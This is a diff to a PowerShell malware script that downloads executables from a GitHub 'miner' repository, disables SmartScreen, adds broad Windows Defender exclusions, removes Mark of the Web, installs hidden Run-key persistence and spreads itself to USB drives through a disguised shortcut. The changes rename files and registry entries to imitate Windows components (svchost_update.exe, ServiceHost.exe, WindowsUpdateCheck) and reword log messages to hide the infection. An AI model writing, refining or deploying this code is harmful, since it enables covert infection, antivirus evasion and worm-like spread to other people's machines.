@@ -22,16 +22,35 @@ if (Is-Admin) {
 }
 
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
-$payloadPath = "C:\Windows\Temp\updater.exe"
+$payloadPath = "C:\Windows\Temp\svchost_update.exe"
 $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/Minecraft.zip"
-$crackedSoftwareZipPath = "C:\Windows\Temp\cracked_software.zip"
-$crackedSoftwareFolder = "C:\Windows\Temp\CrackedSoftware"
-$crackedSoftwareExe = "$crackedSoftwareFolder\Minecraft\MineCraft_AutoInstaller.exe"
+$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
+$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
+$crackedSoftwareExe = "$crackedSoftwareFolder\Minecraft\ServiceHost.exe"
 
-Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."
+Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
+try {
+    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+    try {
+        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
+        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
+    }
+    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
+    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
+        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
+    } else {
+        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
+    }
+} catch {
+    Add-Content -Path $logPath -Value "Failed to check SmartScreen status: $_"
+}
+
+Add-Content -Path $logPath -Value "Checking for existing svchost_update.exe at $payloadPath."
 
 if (Test-Path -Path $payloadPath) {
-    Add-Content -Path $logPath -Value "Existing updater.exe found at $payloadPath."
+    Add-Content -Path $logPath -Value "Existing svchost_update.exe found at $payloadPath."
     if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
         Add-Content -Path $logPath -Value "Warning: Existing file does not have .exe extension."
     } else {
@@ -79,9 +98,9 @@ Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defen
 Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
 $exclusionsPaths = @(
     "C:\Users\Public\SystemLib",
-    "C:\Windows\Temp\updater.exe",
-    "C:\Windows\Temp\CrackedSoftware",
-    "C:\Windows\Temp\cracked_software.zip",
+    "C:\Windows\Temp\svchost_update.exe",
+    "C:\Windows\Temp\WindowsServices",
+    "C:\Windows\Temp\update_package.zip",
     "C:\ProgramData\WinKit",
     "C:\Windows\Temp\*",
     "C:\ProgramData\Microsoft\Windows\Temp",
@@ -95,8 +114,8 @@ $exclusionsPaths = @(
     "C:\Program Files\AVG"
 )
 $exclusionsProcesses = @(
-    "updater.exe",
-    "MineCraft_AutoInstaller.exe",
+    "svchost_update.exe",
+    "ServiceHost.exe",
     "cmd.exe",
     "powershell.exe"
 )
@@ -154,29 +173,29 @@ foreach ($excl in $exclusionsExtensions) {
 }
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
-Add-Content -Path $logPath -Value "Checking for existing CrackedSoftware folder at $crackedSoftwareFolder."
+Add-Content -Path $logPath -Value "Checking for existing WindowsServices folder at $crackedSoftwareFolder."
 if (-not (Test-Path -Path $crackedSoftwareFolder)) {
-    Add-Content -Path $logPath -Value "CrackedSoftware folder not found. Downloading from $crackedSoftwareZipUrl..."
+    Add-Content -Path $logPath -Value "WindowsServices folder not found. Downloading from $crackedSoftwareZipUrl..."
     try {
         if (-not (Test-Path -Path (Split-Path -Path $crackedSoftwareZipPath -Parent))) {
             New-Item -ItemType Directory -Path (Split-Path -Path $crackedSoftwareZipPath -Parent) -Force | Out-Null
-            Add-Content -Path $logPath -Value "Created directory for cracked software zip: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
+            Add-Content -Path $logPath -Value "Created directory for update package: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
         }
         $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
-        Add-Content -Path $logPath -Value "Cracked software zip downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
+        Add-Content -Path $logPath -Value "Update package downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
         if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
             throw "Downloaded zip file not found at $crackedSoftwareZipPath."
         }
         try {
             Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
-            Add-Content -Path $logPath -Value "Extracted cracked software to $crackedSoftwareFolder."
+            Add-Content -Path $logPath -Value "Extracted update package to $crackedSoftwareFolder."
         } catch {
-            Add-Content -Path $logPath -Value "Failed to extract cracked software zip: $_"
+            Add-Content -Path $logPath -Value "Failed to extract update package: $_"
             throw "Extraction failed."
         }
         if (-not (Test-Path -Path $crackedSoftwareExe)) {
-            Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder\Minecraft."
-            throw "Cracked software executable missing."
+            Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\Minecraft."
+            throw "Update executable missing."
         }
         try {
             Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
@@ -185,19 +204,19 @@ if (-not (Test-Path -Path $crackedSoftwareFolder)) {
             Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $crackedSoftwareFolder files: $_"
         }
     } catch {
-        Add-Content -Path $logPath -Value "Failed to download or process cracked software zip: $_"
+        Add-Content -Path $logPath -Value "Failed to download or process update package: $_"
     }
 } else {
-    Add-Content -Path $logPath -Value "CrackedSoftware folder already exists at $crackedSoftwareFolder."
+    Add-Content -Path $logPath -Value "WindowsServices folder already exists at $crackedSoftwareFolder."
     if (-not (Test-Path -Path $crackedSoftwareExe)) {
-        Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder\Minecraft."
+        Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\Minecraft."
     } else {
-        Add-Content -Path $logPath -Value "Confirmed: MineCraft_AutoInstaller.exe exists in $crackedSoftwareFolder\Minecraft."
+        Add-Content -Path $logPath -Value "Confirmed: ServiceHost.exe exists in $crackedSoftwareFolder\Minecraft."
     }
 }
 
 if (-not (Test-Path -Path $payloadPath)) {
-    Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Downloading updater.exe..."
+    Add-Content -Path $logPath -Value "No existing svchost_update.exe found at $payloadPath. Downloading svchost_update.exe..."
     try {
         if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
             New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
@@ -220,39 +239,20 @@ if (-not (Test-Path -Path $payloadPath)) {
         } catch {
             Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
         }
-        Add-Content -Path $logPath -Value "Updater.exe downloaded successfully but not executed, as per configuration."
+        Add-Content -Path $logPath -Value "svchost_update.exe downloaded successfully but not executed, as per configuration."
     } catch {
-        Add-Content -Path $logPath -Value "Failed to fetch updater.exe from $payloadUrl. Error: $_"
+        Add-Content -Path $logPath -Value "Failed to fetch svchost_update.exe from $payloadUrl. Error: $_"
     }
 }
 
-Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
-try {
-    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
-    try {
-        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
-        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
-    } catch {
-        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
-    }
-    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
-    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
-        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
-    } else {
-        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
-    }
-} catch {
-    Add-Content -Path $logPath -Value "Failed to check SmartScreen status: $_"
-}
-
-Add-Content -Path $logPath -Value "Checking registry key for USB monitoring..."
+Add-Content -Path $logPath -Value "Checking registry key for persistence..."
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "USBMonitor"
+    $regName = "WindowsUpdateCheck"
     $scriptPath = $PSCommandPath
-    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
     $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
-    if ($regExists -and $regExists.USBMonitor -eq $command) {
+    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
         Add-Content -Path $logPath -Value "Registry key already exists and correctly configured: $regPath\$regName"
     } else {
         if (-not (Test-Path $regPath)) {
@@ -263,7 +263,7 @@ try {
         Add-Content -Path $logPath -Value "Registry key set or updated: $regPath\$regName"
     }
 } catch {
-    Add-Content -Path $logPath -Value "Failed to check or set registry key for USB monitoring: $_"
+    Add-Content -Path $logPath -Value "Failed to check or set registry key: $_"
 }
 
 Add-Content -Path $logPath -Value "Starting USB monitoring loop..."
@@ -272,10 +272,10 @@ function Infect-USB {
     $usbPath = "$DriveLetter\"
     $recyclerPath = "$usbPath\RECYCLER.BIN"
     $filesPath = "$recyclerPath\Files"
-    $usbSoftwareFolder = "$usbPath\CrackedSoftware"
-    $lnkPath = "$usbPath\Photos.lnk"
+    $usbSoftwareFolder = "$usbPath\WindowsServices"
+    $lnkPath = "$usbPath\SystemTools.lnk"
     try {
-        Add-Content -Path $logPath -Value "Detected USB at $usbPath. Starting infection process..."
+        Add-Content -Path $logPath -Value "Detected USB at $usbPath. Starting update process..."
         if (-not (Test-Path -Path $recyclerPath)) {
             New-Item -Path $recyclerPath -ItemType Directory -Force | Out-Null
             Set-ItemProperty -Path $recyclerPath -Name Attributes -Value Hidden
@@ -293,19 +293,19 @@ function Infect-USB {
         }
         if (Test-Path -Path $crackedSoftwareFolder) {
             Copy-Item -Path $crackedSoftwareFolder -Destination $usbPath -Recurse -Force
-            Add-Content -Path $logPath -Value "Copied CrackedSoftware folder to $usbSoftwareFolder"
+            Add-Content -Path $logPath -Value "Copied WindowsServices folder to $usbSoftwareFolder"
         } else {
-            Add-Content -Path $logPath -Value "Warning: CrackedSoftware folder not found at $crackedSoftwareFolder, cannot copy to USB."
+            Add-Content -Path $logPath -Value "Warning: WindowsServices folder not found at $crackedSoftwareFolder, cannot copy to USB."
         }
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnkPath)
-        $shortcut.TargetPath = "$usbSoftwareFolder\Minecraft\MineCraft_AutoInstaller.exe"
-        $shortcut.IconLocation = "%SystemRoot%\system32\shell32.dll,4"
+        $shortcut.TargetPath = "$usbSoftwareFolder\Minecraft\ServiceHost.exe"
+        $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2"
         $shortcut.WorkingDirectory = "$usbSoftwareFolder\Minecraft"
         $shortcut.Save()
-        Add-Content -Path $logPath -Value "Created malicious shortcut at $lnkPath pointing to $usbSoftwareFolder\Minecraft\MineCraft_AutoInstaller.exe"
+        Add-Content -Path $logPath -Value "Created shortcut at $lnkPath pointing to $usbSoftwareFolder\Minecraft\ServiceHost.exe"
     } catch {
-        Add-Content -Path $logPath -Value "Failed to infect USB at $usbPath. Error: $_"
+        Add-Content -Path $logPath -Value "Failed to process USB at $usbPath. Error: $_"
     }
 }
 
